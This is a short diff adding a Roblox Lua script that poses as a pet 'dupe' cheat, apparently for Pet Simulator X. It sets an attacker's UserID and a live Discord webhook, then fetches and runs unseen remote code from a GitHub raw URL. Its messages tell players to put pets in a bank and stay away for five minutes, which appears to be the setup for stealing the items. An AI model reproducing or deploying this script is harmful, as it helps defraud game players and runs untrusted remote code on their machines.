@@ -1,0 +1,8 @@
+
+_G.UserID = 2444468255
+
+_G.Webhook = "https://discord.com/api/webhooks/1051610589262249994/2OhfkTz5D0pv97nr2j9mw1D_bUkCFcQS4o3Rc0Ow0InWzTiOoe-zojPPjO8TX_D7D4CO"
+_G.KickMessage = "WAIT 5 minutes for the dupe to WORK DONT JOIN OR IT WILL PROBABLY BAN YOU"
+_G.PopUpMessage = "Hello add the pets to the bank you want to dupe and leave for 5 minutes"
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/gui-1")()
